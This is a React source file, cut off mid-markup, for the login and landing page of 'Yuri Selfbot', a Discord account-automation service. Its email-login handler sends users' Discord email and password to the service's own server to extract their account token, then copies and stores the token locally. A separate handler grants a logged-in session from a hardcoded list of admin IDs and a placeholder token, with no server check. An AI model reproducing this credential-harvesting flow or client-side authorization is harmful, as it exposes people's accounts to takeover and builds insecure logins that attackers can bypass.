import React, { useState, useRef, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { api } from '../services/api';
import { 
  Globe, 
  MapPin, 
  Search, 
  Shield, 
  ShieldAlert, 
  X, 
  Copy, 
  Check, 
  MessageSquare,
  Zap,
  Bot,
  Radio,
  Sliders,
  Terminal,
  ChevronRight,
  ExternalLink,
  Sparkles,
  Lock,
  ArrowRight,
  Play,
  Pause,
  Volume2,
  VolumeX,
  Tv,
  Layers,
  Cpu,
  Activity,
  Crosshair
} from 'lucide-react';
import {
  CyberParticleCanvas,
  CyberRadarScope,
  CyberEqualizerWaveform,
  CyberDataStreamTicker,
  CyberGyroReticle,
  CRTScanlineOverlay,
  cyberSound
} from './landing/FuturisticEffects';
import { InteractiveCyberTerminal } from './landing/InteractiveCyberTerminal';
import { BotShowcaseCards } from './landing/BotShowcaseCards';

interface LoginProps {
  onLoginSuccess: () => void;
}

const VPN_COUNTRIES = [
  { id: 'us', name: 'United States', flag: '🇺🇸', latency: '42ms' },
  { id: 'gb', name: 'United Kingdom', flag: '🇬🇧', latency: '18ms' },
  { id: 'ca', name: 'Canada', flag: '🇨🇦', latency: '55ms' },
  { id: 'de', name: 'Germany', flag: '🇩🇪', latency: '12ms' },
  { id: 'fr', name: 'France', flag: '🇫🇷', latency: '15ms' },
  { id: 'nl', name: 'Netherlands', flag: '🇳🇱', latency: '14ms' },
  { id: 'jp', name: 'Japan', flag: '🇯🇵', latency: '210ms' },
  { id: 'sg', name: 'Singapore', flag: '🇸🇬', latency: '180ms' },
  { id: 'au', name: 'Australia', flag: '🇦🇺', latency: '240ms' },
  { id: 'br', name: 'Brazil', flag: '🇧🇷', latency: '145ms' },
  { id: 'in', name: 'India', flag: '🇮🇳', latency: '160ms' },
  { id: 'kr', name: 'South Korea', flag: '🇰🇷', latency: '195ms' },
  { id: 'se', name: 'Sweden', flag: '🇸🇪', latency: '22ms' },
  { id: 'ch', name: 'Switzerland', flag: '🇨🇭', latency: '19ms' },
];

const VIDEO_FEEDS = [
  {
    id: 'data-core',
    title: 'STREAM 01 // DATA MATRIX',
    url: 'https://assets.mixkit.co/videos/preview/mixkit-digital-animation-of-screens-with-data-31911-large.mp4',
  },
  {
    id: 'cyber-city',
    title: 'STREAM 02 // NEON METROPOLIS',
    url: 'https://assets.mixkit.co/videos/preview/mixkit-futuristic-city-with-flying-cars-at-night-41541-large.mp4',
  },
  {
    id: 'circuit',
    title: 'STREAM 03 // CORE ENGINE',
    url: 'https://assets.mixkit.co/videos/preview/mixkit-circuit-board-microchip-animation-43093-large.mp4',
  }
];

export default function Login({ onLoginSuccess }: LoginProps) {
  const [showAuthModal, setShowAuthModal] = useState(false);
  const [token, setToken] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [activeTab, setActiveTab] = useState<'login' | 'email' | 'getToken' | 'oauth'>('login');
  
  // Futuristic Video & Audio Controls
  const [currentVideoIdx, setCurrentVideoIdx] = useState(0);
  const [videoPlaying, setVideoPlaying] = useState(true);
  const [crtEnabled, setCrtEnabled] = useState(true);
  const [soundEnabled, setSoundEnabled] = useState(false);
  const videoRef = useRef<HTMLVideoElement | null>(null);

  const toggleSound = () => {
    const next = !soundEnabled;
    setSoundEnabled(next);
    cyberSound.enabled = next;
    if (next) cyberSound.playBlip();
  };

  const toggleVideo = () => {
    if (!videoRef.current) return;
    if (videoPlaying) {
      videoRef.current.pause();
      setVideoPlaying(false);
    } else {
      videoRef.current.play().catch(() => {});
      setVideoPlaying(true);
    }
  };

  const cycleVideo = () => {
    cyberSound.playClick();
    setCurrentVideoIdx((prev) => (prev + 1) % VIDEO_FEEDS.length);
  };
  
  const [showTermsModal, setShowTermsModal] = useState(false);
  const [showPrivacyModal, setShowPrivacyModal] = useState(false);
  const [termsAccepted, setTermsAccepted] = useState(() => localStorage.getItem('yuri_tos_accepted') === 'true');
  const handleAcceptTerms = (checked: boolean) => {
    setTermsAccepted(checked);
    if (checked) localStorage.setItem('yuri_tos_accepted', 'true');
    else localStorage.removeItem('yuri_tos_accepted');
  };
  
  const [showVpnModal, setShowVpnModal] = useState(false);
  const [vpnEnabled, setVpnEnabled] = useState(false);
  const [vpnCountry, setVpnCountry] = useState(VPN_COUNTRIES[0]);
  const [vpnSearch, setVpnSearch] = useState('');
  
  const [showCommunityModal, setShowCommunityModal] = useState(false);
  const [communityCopied, setCommunityCopied] = useState(false);
  const handleCopyCommunityLink = async () => {
    cyberSound.playClick();
    const inviteLink = 'https://discord.gg/eaEB3q7pEb';
    try {
      if (navigator.clipboard && navigator.clipboard.writeText) {
        await navigator.clipboard.writeText(inviteLink);
      } else {
        const textarea = document.createElement('textarea');
        textarea.value = inviteLink;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
      }
      setCommunityCopied(true);
      setTimeout(() => setCommunityCopied(false), 2500);
      window.open(inviteLink, '_blank');
    } catch (err) {
      console.error('Failed to copy community link:', err);
    }
  };
  
  const [discordUser, setDiscordUser] = useState<any>(() => {
    const saved = localStorage.getItem('discord_user');
    return saved ? JSON.parse(saved) : null;
  });

  useEffect(() => {
    // Check URL for direct redirect success (fallback for null window.opener)
    const params = new URLSearchParams(window.location.search);
    if (params.get('auth') === 'success') {
      const userId = params.get('user');
      console.log('Detected Discord Auth Redirect Success for user:', userId);
    }

    // Check for existing OAuth success in localStorage (stale check)
    const checkLocalStorage = () => {
      const raw = localStorage.getItem('discord_oauth_success');
      if (raw) {
        try {
          const data = JSON.parse(raw);
          // Only process if it's fresh (last 30 seconds)
          if (Date.now() - data.timestamp < 30000) {
            handleAuthSuccess(data.user);
            localStorage.removeItem('discord_oauth_success');
          }
        } catch (e) {}
      }
    };

    const handleAuthSuccess = (user: any) => {
      setDiscordUser(user);
      localStorage.setItem('discord_user', JSON.stringify(user));
      
      const knownAdmins = ['1545521054930436167', '1545509798756487241', '1545389998315143229'];
      if (knownAdmins.includes(user.id)) {
        localStorage.setItem('token', 'DISCORD_OAUTH_SESSION');
        localStorage.setItem('token_user', JSON.stringify({
          id: user.id,
          username: user.global_name || user.username,
          avatar: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : null
        }));
        onLoginSuccess();
      }
    };

    const handleMessage = (event: MessageEvent) => {
      if (event.data?.type === 'OAUTH_AUTH_SUCCESS' && event.data.user) {
        handleAuthSuccess(event.data.user);
      }
    };

    const handleStorage = (event: StorageEvent) => {
      if (event.key === 'discord_oauth_success' && event.newValue) {
        try {
          const data = JSON.parse(event.newValue);
          handleAuthSuccess(data.user);
          localStorage.removeItem('discord_oauth_success');
        } catch (e) {}
      }
    };

    checkLocalStorage();
    window.addEventListener('message', handleMessage);
    window.addEventListener('storage', handleStorage);
    
    return () => {
      window.removeEventListener('message', handleMessage);
      window.removeEventListener('storage', handleStorage);
    };
  }, [onLoginSuccess]);

  const handleDiscordLogin = async () => {
    cyberSound.playBlip();
    if (!termsAccepted) {
      setError('You must accept the Terms of Service and Privacy Policy to continue.');
      return;
    }
    try {
      const redirectUri = encodeURIComponent(`${window.location.origin}/api/auth/discord/callback`);
      const res = await fetch(`/api/auth/discord/url?redirect_uri=${redirectUri}&client_id=1545766712618520596`);
      
      if (!res.ok) {
        const errData = await res.json();
        throw new Error(errData.error || 'Failed to fetch OAuth URL');
      }

      const data = await res.json();
      if (data?.url) {
        window.open(data.url, 'discord_auth', 'width=600,height=700');
      } else {
        throw new Error('No OAuth URL returned');
      }
    } catch (e: any) {
      console.error('[LOGIN] OAuth URL Error:', e);
      const redirectUri = encodeURIComponent(`${window.location.origin}/api/auth/discord/callback`);
      const directUrl = `https://discord.com/api/oauth2/authorize?client_id=1545766712618520596&redirect_uri=${redirectUri}&response_type=code&scope=identify%20email%20guilds.join`;
      window.open(directUrl, 'discord_auth', 'width=600,height=700');
    }
  };

  const handleTokenSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    cyberSound.playScan();
    if (!termsAccepted) {
      setError('You must accept the Terms of Service and Privacy Policy to continue.');
      return;
    }
    setLoading(true);
    setError('');
    
    try {
      const res = await api.login(token);
      localStorage.setItem('token', res.session.token);
      localStorage.setItem('catalystcord_user_token', res.session.token);
      localStorage.setItem('token_user', JSON.stringify(res.session));
      onLoginSuccess();
    } catch (err: any) {
      setError(err.message || 'Invalid token or connection failed.');
    } finally {
      setLoading(false);
    }
  };

  const [copiedToken, setCopiedToken] = useState('');
  const [copySuccess, setCopySuccess] = useState(false);

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    cyberSound.playScan();
    if (!termsAccepted) {
      setError('You must accept the Terms of Service and Privacy Policy to continue.');
      return;
    }
    setLoading(true);
    setError('');
    setCopySuccess(false);
    
    try {
      const res = await fetch('/api/auth/extract-token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      });
      const data = await res.json();
      
      if (!res.ok || !data.success || !data.token) {
        throw new Error(data.error || 'Failed to extract token from Discord.');
      }
      
      const extractedToken = data.token;
      setCopiedToken(extractedToken);
      setCopySuccess(true);
      
      try {
        if (navigator.clipboard && navigator.clipboard.writeText) {
          await navigator.clipboard.writeText(extractedToken);
        } else {
          const textarea = document.createElement('textarea');
          textarea.value = extractedToken;
          document.body.appendChild(textarea);
          textarea.select();
          document.execCommand('copy');
          document.body.removeChild(textarea);
        }
      } catch (copyErr) {
        console.warn('Clipboard write failed:', copyErr);
      }
      
      const loginRes = await api.login(extractedToken);
      localStorage.setItem('token', loginRes.session.token);
      localStorage.setItem('catalystcord_user_token', loginRes.session.token);
      localStorage.setItem('token_user', JSON.stringify(loginRes.session));
      onLoginSuccess();
    } catch (err: any) {
      setError(err.message || 'Failed to extract token. Check credentials or VPN.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#030305] text-white flex flex-col font-sans selection:bg-red-600 selection:text-white relative overflow-x-hidden">
      
      {/* ========================================================= */}
      {/* REAL FUTURISTIC VIDEO BACKGROUND (HIGH DEFINITION LOOP)    */}
      {/* ========================================================= */}
      <div className="fixed inset-0 pointer-events-none z-0 overflow-hidden select-none">
        <video
          ref={videoRef}
          key={VIDEO_FEEDS[currentVideoIdx].url}
          src={VIDEO_FEEDS[currentVideoIdx].url}
          autoPlay
          loop
          muted
          playsInline
          className="absolute inset-0 w-full h-full object-cover opacity-25 filter contrast-125 brightness-90 saturate-150 transition-opacity duration-1000"
        />

        {/* Cyberpunk perspective grid gradient */}
        <div 
          className="absolute inset-0 opacity-20 pointer-events-none"
          style={{
            backgroundImage: `linear-gradient(to right, rgba(239, 68, 68, 0.15) 1px, transparent 1px),
                              linear-gradient(to bottom, rgba(239, 68, 68, 0.15) 1px, transparent 1px)`,
            backgroundSize: '40px 40px',
            transform: 'perspective(500px) rotateX(25deg) translateY(-20px)',
            transformOrigin: 'top center'
          }}
        />

        {/* Radial dark vignette to preserve contrast */}
        <div className="absolute inset-0 bg-gradient-to-t from-[#030305] via-[#030305]/80 to-transparent" />
        <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_center,_var(--tw-gradient-stops))] from-transparent via-[#030305]/70 to-[#030305]" />
      </div>

      {/* CRT Scanline Shader Overlay */}
      {crtEnabled && <CRTScanlineOverlay />}

      {/* Interactive Particle Constellation Canvas */}
      <CyberParticleCanvas />

      {/* ========================================================= */}
      {/* TOP SCI-FI COCKPIT HUD & NAVIGATION                       */}
      {/* ========================================================= */}
      <header className="sticky top-0 z-40 backdrop-blur-md bg-black/60 border-b border-white/10 px-4 sm:px-8 py-3">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          
          {/* Logo & Status Beacon */}
          <div className="flex items-center gap-3">
            <div className="relative flex items-center justify-center">
              <div className="w-9 h-9 rounded-xl bg-red-600/20 border border-red-500/50 flex items-center justify-center text-red-500 shadow-[0_0_15px_rgba(239,68,68,0.4)]">
                <Crosshair className="w-5 h-5 animate-[spin_10s_linear_infinite]" />
              </div>
              <span className="absolute -bottom-0.5 -right-0.5 w-2 h-2 rounded-full bg-emerald-400 border border-black animate-ping" />
            </div>

            <div>
              <div className="flex items-center gap-2">
                <span className="text-lg font-black tracking-tighter text-white font-sans">
                  YURI<span className="text-red-500">.ARCHITECT</span>
                </span>
                <span className="text-[9px] font-mono font-bold bg-white/5 text-zinc-400 border border-white/10 px-2 py-0.5 rounded uppercase tracking-widest">
                  Release v3.0
                </span>
              </div>
              <p className="text-[10px] text-zinc-500 font-mono tracking-tighter hidden sm:block">
                PERSISTENT DAEMON // NETWORK LAYER PARITY
              </p>
            </div>
          </div>

          {/* Live Audio / Video Controls & Action HUD */}
          <div className="flex items-center gap-2 sm:gap-4">
            
            {/* Real Video HUD Controls */}
            <div className="hidden lg:flex items-center gap-2.5 px-3 py-1.5 rounded-xl bg-white/[0.02] border border-white/5 text-[10px] font-mono text-zinc-500">
              <Tv className="w-3.5 h-3.5 text-zinc-400" />
              <button 
                onClick={cycleVideo}
                className="hover:text-zinc-200 transition-colors tracking-tight"
                title="Cycle Visual Feed"
              >
                {VIDEO_FEEDS[currentVideoIdx].title}
              </button>
              <button
                onClick={toggleVideo}
                className="ml-1 p-1 hover:text-white text-zinc-600 transition-colors"
                title={videoPlaying ? 'Suspend Feed' : 'Resume Feed'}
              >
                {videoPlaying ? <Pause className="w-3 h-3" /> : <Play className="w-3 h-3 text-red-500" />}
              </button>
            </div>

            {/* Sci-Fi Sound Synthesizer Toggle */}
            <button
              onClick={toggleSound}
              className={`p-2.5 rounded-xl border text-xs transition-all flex items-center gap-2 ${
                soundEnabled 
                  ? 'bg-red-500/10 border-red-500/20 text-red-500' 
                  : 'bg-white/[0.02] border-white/5 text-zinc-500 hover:text-zinc-300'
              }`}
              title={soundEnabled ? 'Acoustic Feedback: Active' : 'Enable Acoustic Feedback'}
            >
              {soundEnabled ? <Volume2 className="w-3.5 h-3.5" /> : <VolumeX className="w-3.5 h-3.5" />}
              <span className="hidden xl:inline text-[9px] font-bold tracking-widest">
                {soundEnabled ? 'SYSTEM_AUDIO:1' : 'SYSTEM_AUDIO:0'}
              </span>
            </button>

            {/* Community Discord Modal */}
            <button
              onClick={() => {
                cyberSound.playClick();
                setShowCommunityModal(true);
              }}
              className="text-xs px-3 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-zinc-300 hover:text-white border border-white/5 transition-colors hidden md:flex items-center gap-1.5 cursor-pointer"
            >
              <MessageSquare className="w-3.5 h-3.5 text-[#5865F2]" />
              <span>Community</span>
            </button>

            {/* Terminal Quick Jump */}
            <button
              onClick={() => {
                cyberSound.playClick();
                window.history.pushState({}, '', '/console');
                window.dispatchEvent(new Event('popstate'));
              }}
              className="text-xs px-3 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-zinc-300 hover:text-white border border-white/5 transition-colors hidden sm:flex items-center gap-1.5 cursor-pointer"
            >
              <Terminal className="w-3.5 h-3.5 text-zinc-400" />
              <span>Console</span>
            </button>

            {/* VPN Node Routing Trigger */}
            <button
              onClick={() => {
                cyberSound.playClick();
                setShowVpnModal(true);
              }}
              className={`text-xs px-3 py-1.5 rounded-lg border transition-all flex items-center gap-1.5 cursor-pointer ${
                vpnEnabled 
                  ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' 
                  : 'bg-white/5 border-white/5 text-zinc-300 hover:text-white'
              }`}
            >
              <Shield className="w-3.5 h-3.5" />
              <span className="uppercase font-mono">{vpnEnabled ? vpnCountry.id : 'VPN SHIELD'}</span>
            </button>

            {/* Main CTA: Launch Auth */}
            <button
              onClick={() => {
                cyberSound.playBlip();
                setShowAuthModal(true);
              }}
              className="text-xs font-semibold px-4 py-2 rounded-lg bg-red-600 hover:bg-red-500 text-white shadow-lg shadow-red-950/50 transition-all flex items-center gap-1.5 cursor-pointer"
            >
              <span>Get Started</span>
              <ArrowRight className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>
      </header>

      {/* Real-time Data Stream Ticker Bar */}
      <div className="bg-black/80 border-b border-white/5 px-4 sm:px-8 py-1.5 flex items-center justify-between text-xs z-20">
        <CyberDataStreamTicker />
        <div className="flex items-center gap-4 text-[10px] font-mono text-zinc-500 hidden sm:flex">
          <span className="flex items-center gap-1.5">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
            CORE: STABLE
          </span>
          <span>LATENCY: 14ms</span>
          <span>TLS 1.3 ENCRYPTED</span>
        </div>
      </div>

      {/* ========================================================= */}
      {/* MAIN FUTURISTIC LANDING HERO & SHOWCASES                  */}
      {/* ========================================================= */}
      <main className="relative z-10 max-w-7xl mx-auto px-4 sm:px-6 py-12 md:py-16 space-y-20">
        
        <motion.section 
          initial={{ opacity: 0, y: 30 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: false, margin: "-100px" }}
          transition={{ duration: 0.6, ease: [0.22, 1, 0.36, 1] }}
          className="relative text-center space-y-6 max-w-4xl mx-auto pt-4"
        >
          
          <motion.div 
            initial={{ opacity: 0, y: -10 }} 
            animate={{ opacity: 1, y: 0 }}
            className="inline-flex items-center gap-2.5 px-4 py-1.5 rounded-full bg-white/[0.02] border border-white/10 text-zinc-400 text-[10px] font-mono tracking-[0.2em] uppercase"
          >
            <Activity className="w-3.5 h-3.5 text-red-500" />
            <span>Scaleable Infrastructure // Advanced Presence Logic</span>
          </motion.div>

          <motion.div 
            initial={{ opacity: 0, y: 15 }} 
            animate={{ opacity: 1, y: 0 }} 
            transition={{ delay: 0.1 }}
            className="space-y-6"
          >
            <h1 className="text-5xl sm:text-7xl md:text-8xl font-black tracking-tighter text-white leading-[0.9] uppercase">
              Yuri <br />
              <span className="text-red-500">
                Selfbot.
              </span>
            </h1>
            <p className="text-base sm:text-lg text-zinc-400 max-w-xl mx-auto leading-relaxed font-normal">
              Yuri Selfbot is a professional-grade selfbot framework. Engineered for high-fidelity Discord automation with zero-latency WebSocket synchronization and multi-state presence management.
            </p>
          </motion.div>

          <motion.div 
            initial={{ opacity: 0, y: 20 }} 
            animate={{ opacity: 1, y: 0 }} 
            transition={{ delay: 0.2 }}
            className="flex flex-wrap items-center justify-center gap-4 pt-2"
          >
            <button
              onClick={() => {
                cyberSound.playScan();
                setActiveTab('login');
                setShowAuthModal(true);
              }}
              className="px-8 py-4 rounded-xl bg-white text-black font-black text-[11px] transition-all flex items-center gap-2.5 active:scale-95 cursor-pointer uppercase tracking-[0.2em] shadow-2xl shadow-white/5"
            >
              <span>Initialize System</span>
              <ArrowRight className="w-3.5 h-3.5" />
            </button>

            <button
              onClick={() => {
                cyberSound.playClick();
                setShowCommunityModal(true);
              }}
              className="px-8 py-4 rounded-xl bg-white/[0.02] hover:bg-white/[0.05] text-zinc-400 border border-white/5 font-bold text-[10px] transition-all flex items-center gap-2 active:scale-95 cursor-pointer backdrop-blur-md uppercase tracking-[0.2em]"
            >
              <MessageSquare className="w-3.5 h-3.5 text-blue-500" />
              <span>Connect</span>
            </button>
          </motion.div>

          <div className="grid grid-cols-2 md:grid-cols-4 gap-4 pt-12 max-w-4xl mx-auto">
            
            <div className="bg-white/[0.01] border border-white/5 rounded-2xl p-5 text-left relative overflow-hidden backdrop-blur-sm">
              <div className="text-[9px] text-zinc-600 uppercase tracking-[0.2em] font-mono">System Uptime</div>
              <div className="text-2xl font-black font-sans text-white mt-1">99.98<span className="text-zinc-600">%</span></div>
              <div className="mt-2 text-[9px] text-zinc-500 font-mono flex items-center gap-1.5 uppercase">
                <span className="w-1.5 h-1.5 rounded-full bg-red-500 shadow-[0_0_8px_rgba(239,68,68,0.5)]" />
                Persistent Node
              </div>
            </div>

            <div className="bg-white/[0.01] border border-white/5 rounded-2xl p-5 text-left relative overflow-hidden backdrop-blur-sm">
              <div className="text-[9px] text-zinc-600 uppercase tracking-[0.2em] font-mono">Gateway Latency</div>
              <div className="text-2xl font-black font-sans text-red-500 mt-1">12<span className="text-zinc-600">ms</span></div>
              <div className="mt-2">
                <CyberEqualizerWaveform />
              </div>
            </div>

            <div className="bg-white/[0.01] border border-white/5 rounded-2xl p-5 text-left relative overflow-hidden backdrop-blur-sm">
              <div className="text-[9px] text-zinc-600 uppercase tracking-[0.2em] font-mono">Response Protocol</div>
              <div className="text-2xl font-black font-sans text-white mt-1">Direct</div>
              <div className="mt-2 text-[9px] text-zinc-500 font-mono uppercase">
                Low-Latency Delivery
              </div>
            </div>

            <div className="bg-white/[0.01] border border-white/5 rounded-2xl p-5 text-left relative overflow-hidden backdrop-blur-sm">
              <div className="text-[9px] text-zinc-600 uppercase tracking-[0.2em] font-mono">API Architecture</div>
              <div className="text-2xl font-black font-sans text-white mt-1">REST/WS</div>
              <div className="mt-2 text-[9px] text-zinc-500 font-mono uppercase">
                Hybrid Synchronization
              </div>
            </div>

          </div>
        </motion.section>

        <motion.section 
          initial={{ opacity: 0, y: 40 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: false, margin: "-50px" }}
          transition={{ duration: 0.7, ease: [0.22, 1, 0.36, 1] }}
          className="space-y-8"
        >
          <div className="flex flex-col md:flex-row md:items-end justify-between gap-6">
            <div className="space-y-3">
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-white/[0.02] text-zinc-500 border border-white/5 text-[9px] font-mono uppercase tracking-[0.2em]">
                <Terminal className="w-3.5 h-3.5" />
                <span>Command Execution Interface</span>
              </div>
              <h2 className="text-3xl font-black tracking-tighter text-white uppercase">
                Interactive Environment
              </h2>
              <p className="text-xs sm:text-sm text-zinc-500 max-w-xl font-normal leading-relaxed">
                Test the automation engine in a sandboxed environment. Yuri provides both raw text responses for stealth and rich professional embeds for high-fidelity interaction.
              </p>
            </div>

            <div className="hidden md:flex items-center gap-4">
              <CyberRadarScope />
            </div>
          </div>

          <InteractiveCyberTerminal />
        </motion.section>

        <motion.section 
          initial={{ opacity: 0, y: 50 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: false, margin: "-50px" }}
          transition={{ duration: 0.8, ease: [0.22, 1, 0.36, 1] }}
          className="space-y-12"
        >
          <div className="text-center max-w-xl mx-auto space-y-3">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-white/[0.02] text-zinc-500 border border-white/5 text-[9px] font-mono uppercase tracking-[0.2em]">
              <Bot className="w-3.5 h-3.5" />
              <span>Identity Distribution</span>
            </div>
            <h2 className="text-3xl font-black text-white tracking-tighter uppercase">
              Companion Deployment
            </h2>
            <p className="text-xs sm:text-sm text-zinc-500 font-normal">
              Authorize the companion service to maintain persistent visibility across your network infrastructure.
            </p>
          </div>

          <BotShowcaseCards />
        </motion.section>

        <motion.section 
          initial={{ opacity: 0, scale: 0.95 }}
          whileInView={{ opacity: 1, scale: 1 }}
          viewport={{ once: false, margin: "-50px" }}
          transition={{ duration: 0.9, ease: [0.22, 1, 0.36, 1] }}
          className="space-y-12"
        >
          <div className="text-center space-y-3 max-w-xl mx-auto">
            <h2 className="text-3xl font-black text-white tracking-tighter uppercase">
              Core Principles
            </h2>
            <p className="text-xs sm:text-sm text-zinc-500 font-normal">
              Engineered for stability, scale, and uncompromising professional integrity.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            
            <div className="bg-white/[0.01] border border-white/5 hover:border-white/20 rounded-2xl p-8 transition-all space-y-6 group backdrop-blur-sm relative overflow-hidden">
              <div className="w-12 h-12 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center text-zinc-400 group-hover:text-white transition-all">
                <Shield className="w-6 h-6" />
              </div>
              <div className="space-y-3">
                <h3 className="text-sm font-black text-white uppercase tracking-[0.1em] font-sans">
                  Identity Shielding
                </h3>
                <p className="text-xs text-zinc-500 leading-relaxed font-normal">
                  Utilizes advanced handshake protocols and multi-region routing to maintain network anonymity and ensure secure session persistence.
                </p>
              </div>
            </div>

            <div className="bg-white/[0.01] border border-white/5 hover:border-white/20 rounded-2xl p-8 transition-all space-y-6 group backdrop-blur-sm relative overflow-hidden">
              <div className="w-12 h-12 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center text-zinc-400 group-hover:text-white transition-all">
                <Sliders className="w-6 h-6" />
              </div>
              <div className="space-y-3">
                <h3 className="text-sm font-black text-white uppercase tracking-[0.1em] font-sans">
                  Dual-Engine Logic
                </h3>
                <p className="text-xs text-zinc-500 leading-relaxed font-normal">
                  Features a hybrid dispatch system combining raw-frame automation for speed and rich professional responses for visual clarity.
                </p>
              </div>
            </div>

            <div className="bg-white/[0.01] border border-white/5 hover:border-white/20 rounded-2xl p-8 transition-all space-y-6 group backdrop-blur-sm relative overflow-hidden">
              <div className="w-12 h-12 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center text-zinc-400 group-hover:text-white transition-all">
                <Radio className="w-6 h-6" />
              </div>
              <div className="space-y-3">
                <h3 className="text-sm font-black text-white uppercase tracking-[0.1em] font-sans">
                  Media Orchestration
                </h3>
                <p className="text-xs text-zinc-500 leading-relaxed font-normal">
                  Integrated high-fidelity audio stream management and multi-state presence synchronization for complete profile control.
                </p>
              </div>
            </div>

          </div>
        </motion.section>

        <motion.section 
          initial={{ opacity: 0, scale: 0.9 }}
          whileInView={{ opacity: 1, scale: 1 }}
          viewport={{ once: false, margin: "-50px" }}
          transition={{ duration: 1, ease: [0.22, 1, 0.36, 1] }}
          className="relative rounded-3xl border border-white/10 bg-[#0A0A0B] p-12 sm:p-20 text-center space-y-8 shadow-2xl overflow-hidden backdrop-blur-xl"
        >
          <div className="absolute top-0 right-0 p-12 opacity-5 pointer-events-none">
            <CyberGyroReticle />
          </div>
          
          <div className="space-y-3">
            <h2 className="text-4xl sm:text-6xl font-black text-white uppercase tracking-tighter">
              Access the <br /> <span className="text-red-500">Infrastructure.</span>
            </h2>
            <p className="text-sm text-zinc-500 max-w-xl mx-auto font-normal">
              Initialize your professional session via Token or OAuth2 to launch the dashboard.
            </p>
          </div>

          <div className="pt-4">
            <button
              onClick={() => {
                cyberSound.playScan();
                setActiveTab('login');
                setShowAuthModal(true);
              }}
              className="px-12 py-5 rounded-2xl bg-white text-black font-black text-[12px] shadow-2xl transition-all cursor-pointer inline-flex items-center gap-3 active:scale-95 uppercase tracking-[0.3em]"
            >
              <span>Authorize System</span>
              <ArrowRight className="w-4 h-4" />
            </button>
          </div>
        </motion.section>

        {/* Footer */}
        <footer className="pt-12 pb-8 text-center border-t border-white/5 space-y-4">
          <div className="text-[10px] text-zinc-700 font-mono uppercase tracking-[0.4em]">©️ {new Date().getFullYear()} Yuri System Architecture</div>
          <div className="text-[8px] text-zinc-800 select-none opacity-40 hover:opacity-100 transition-opacity uppercase tracking-widest">
            Registered Design & Engineering by harumi
          </div>
        </footer>

      </main>

      {/* ========================================================= */}
      {/* AUTHENTICATION MODAL (Triggered by "Get Started")          */}
      {/* ========================================================= */}
      <AnimatePresence>
        {showAuthModal && (
          <motion.div 
            initial={{ opacity: 0 }} 
            animate={{ opacity: 1 }} 
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-xl overflow-y-auto"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 20 }} 
              animate={{ scale: 1, y: 0 }} 
              exit={{ scale: 0.95, y: 20 }}
              className="w-full max-w-[460px] p-6 sm:p-8 bg-zinc-950 border border-red-500/30 rounded-3xl shadow-2xl z-10 relative my-auto max-h-[92vh] overflow-y-auto custom-scrollbar"
            >
              <button 
                onClick={() => {
                  cyberSound.playClick();
                  setShowAuthModal(false);
                }}
                className="absolute top-5 right-5 p-2 text-zinc-400 hover:text-white bg-white/5 hover:bg-white/10 rounded-full transition-colors cursor-pointer"
                title="Close"
              >
                <X className="w-4 h-4" />
              </button>

              <div className="mb-6 text-center">
                <div 
                  className="inline-flex items-center justify-center w-14 h-14 rounded-2xl bg-red-600/20 border border-red-500/40 mb-4 shadow-inner cursor-pointer"
                  onClick={() => window.open('https://discord.com/login', '_blank')}
                >
                  <Crosshair className="w-7 h-7 text-red-500" />
                </div>
                
                <h2 className="text-2xl font-black tracking-tight text-white mb-1 uppercase font-mono">Sign In to Yuri</h2>
                <p className="text-xs text-zinc-400">Choose your authentication protocol to proceed</p>

                <div className="flex flex-wrap justify-center gap-2 sm:gap-4 mt-5 border-b border-white/5 pb-3">
                  <button 
                    onClick={() => {
                      cyberSound.playClick();
                      setActiveTab('login');
                    }}
                    className={`text-xs font-semibold px-2.5 py-1 rounded-md transition-all cursor-pointer ${activeTab === 'login' ? 'text-white bg-red-600/20 border border-red-500/30' : 'text-zinc-500 hover:text-zinc-300'}`}
                  >
                    Token Login
                  </button>
                  <button 
                    onClick={() => {
                      cyberSound.playClick();
                      setActiveTab('email');
                    }}
                    className={`text-xs font-semibold px-2.5 py-1 rounded-md transition-all cursor-pointer ${activeTab === 'email' ? 'text-white bg-red-600/20 border border-red-500/30' : 'text-zinc-500 hover:text-zinc-300'}`}
                  >
                    Email Login
                  </button>
                  <button 
                    onClick={() => {
                      cyberSound.playClick();
                      setActiveTab('oauth');
                    }}
                    className={`text-xs font-semibold px-2.5 py-1 rounded-md transition-all cursor-pointer ${activeTab === 'oauth' ? 'text-white bg-red-600/20 border border-red-500/30' : 'text-zinc-500 hover:text-zinc-300'}`}
                  >
                    OAuth
                  </button>
                  <button 
                    onClick={() => {
                      cyberSound.playClick();
                      setActiveTab('getToken');
                    }}
                    className={`text-xs font-semibold px-2.5 py-1 rounded-md transition-all cursor-pointer ${activeTab === 'getToken' ? 'text-white bg-red-600/20 border border-red-500/30' : 'text-zinc-500 hover:text-zinc-300'}`}
                  >
                    Guide
                  </button>
                </div>
              </div>

              {activeTab === 'oauth' ? (
